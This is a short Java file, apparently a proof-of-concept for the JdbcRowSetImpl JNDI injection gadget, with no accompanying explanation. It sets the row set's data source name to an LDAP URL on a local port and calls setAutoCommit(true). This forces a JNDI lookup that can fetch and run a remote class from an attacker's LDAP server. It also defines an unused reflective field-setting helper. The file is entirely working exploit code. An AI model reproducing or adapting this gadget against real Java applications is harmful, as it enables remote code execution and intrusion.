import com.sun.rowset.JdbcRowSetImpl;
import java.lang.reflect.Field;

public class MAIN {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:1389/ivvhnu");
        jdbcRowSet.setAutoCommit(true);
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

}
